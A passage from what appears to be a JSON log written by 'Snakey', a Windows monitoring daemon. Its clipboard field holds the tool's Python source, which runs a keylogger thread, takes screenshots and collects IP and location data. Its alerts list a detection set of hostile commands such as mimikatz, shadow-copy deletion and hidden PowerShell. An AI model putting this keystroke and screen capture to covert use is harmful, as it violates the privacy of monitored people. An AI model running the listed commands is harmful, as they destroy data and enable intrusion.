AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "ceeee3432b507968926cfe91dce9df74c62766517ea1b06b46ff91b9c8d7b7c7", "_raw_log_hash": "265692ea67d55836dd92350575ac18578714804eb0ad96ff54354d91bfcf1997"}
{"timestamp": "2025-06-11T17:09:35.440431+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, 